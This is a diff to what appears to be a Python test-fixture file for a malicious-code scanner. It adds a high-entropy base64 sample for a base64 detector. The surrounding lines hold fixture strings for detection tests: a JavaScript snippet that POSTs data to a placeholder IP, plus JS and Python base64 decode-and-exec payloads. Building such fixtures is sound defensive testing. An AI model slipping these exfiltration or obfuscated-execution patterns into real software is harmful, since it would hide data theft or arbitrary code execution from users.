@@ -19,6 +19,9 @@ EXFIL_JS = ("const https = require('https');\n"
             "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n")
 DECODE_EXEC_JS = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n"
 DECODE_EXEC_PY = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
+#: base64 of 240 bytes that do not repeat: 320 characters of every class, what SC-B64 reports (G-5 passes over a run
+#: of one class of characters or a short period repeated, which `"QUJD" * n` and `"Zm9v" * n` are)
+B64_DATA = __import__("base64").b64encode(bytes((i * 7919) % 256 for i in range(240))).decode()
 ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 200
 
 
